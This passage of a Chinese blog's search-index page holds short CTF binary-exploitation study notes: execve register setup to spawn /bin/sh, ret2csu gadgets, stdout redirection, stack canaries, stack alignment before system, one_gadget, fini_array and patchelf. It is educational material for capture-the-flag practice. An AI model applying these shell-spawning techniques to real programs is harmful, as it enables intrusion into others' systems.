title="系统调用的知识"></a>系统调用的知识</h3><p>系统调用号，即 e&#x2F;rax 应该为 0xb<br>第一个参数，即 e&#x2F;rbx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 e&#x2F;rcx 应该为 0<br>第三个参数，即 e&#x2F;rdx 应该为 0<br>调用系统函数时会通过内联汇编代码插入int 0x80的中断指令，(不仅会插入中断指令，还会将系统调用编号设置给 %eax 寄存器）<br>    #pop rbx,rbp,r12,r13,r14,r15<br>    #rbx should be 0,<br>    #rbp should be 1,enable not to jump<br>    #r12 should be the function we want to call<br>    #rdi&#x3D;edi&#x3D;r15d<br>    #rsi&#x3D;r14<br>    #rdx&#x3D;r13<br>中级rop利用了在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。<br>这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。</p><h3 id="重指向："><a href="#重指向：" class="headerlink" title="重指向："></a>重指向：</h3><p>​    exec 1&gt;&amp;0（输出重指向），exec 0&lt;&amp;0（输入重指向）</p><h3 id="代替libcseacher的网站："><a href="#代替libcseacher的网站：" class="headerlink" title="代替libcseacher的网站："></a>代替libcseacher的网站：</h3><p>​    libc.blukat.me</p><h3 id="随机数的知识点："><a href="#随机数的知识点：" class="headerlink" title="随机数的知识点："></a>随机数的知识点：</h3><p>​     libc库一样，种子一样，生成的随机数一样</p><h3 id="canary："><a href="#canary：" class="headerlink" title="canary："></a>canary：</h3><ul><li>Canary值在rbp到rsp之间（并不一定是rbp-8的位置）</li><li>Canary值以0x00结尾,如果程序没有漏洞但栈上面刚好是一个满的字符串,这个0x00可以当做截断,避免被打印出来</li><li>Canary值如果被改写,程序会崩溃</li><li>一般为4&#x2F;8位</li></ul><h3 id="ubuntu18后system要进行栈对齐"><a href="#ubuntu18后system要进行栈对齐" class="headerlink" title="ubuntu18后system要进行栈对齐"></a>ubuntu18后system要进行栈对齐</h3><p>需要加个ret平衡栈，用来进行栈对齐，栈平衡问题，ubuntu18之后system会出现这个问题，有题目可知，这道题就部署在ubuntu18上</p><p>flag可以藏于环境变量中（env可以查看所有环境变量）</p><h3 id="one-gadget的使用："><a href="#one-gadget的使用：" class="headerlink" title="one_gadget的使用："></a>one_gadget的使用：</h3><p>   one_gadget libc的版本</p><h3 id="bytes-fromhex-："><a href="#bytes-fromhex-：" class="headerlink" title="bytes.fromhex ()："></a>bytes.fromhex ()：</h3><p>Python 中使用 bytes.fromhex () 把十六进制转换为字节的函数</p><h3 id="函数fini-array"><a href="#函数fini-array" class="headerlink" title="函数fini_array:"></a>函数fini_array:</h3><p>程序执行返回后会执行fini_array中内容</p><h3 id="patchelf的使用："><a href="#patchelf的使用：" class="headerlink" title="patchelf的使用："></a>patchelf的使用：</h3><p>patchelf –replace-needed libc.so.6 .&#x2F;libc.so.6 .&#x2F;pwn</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
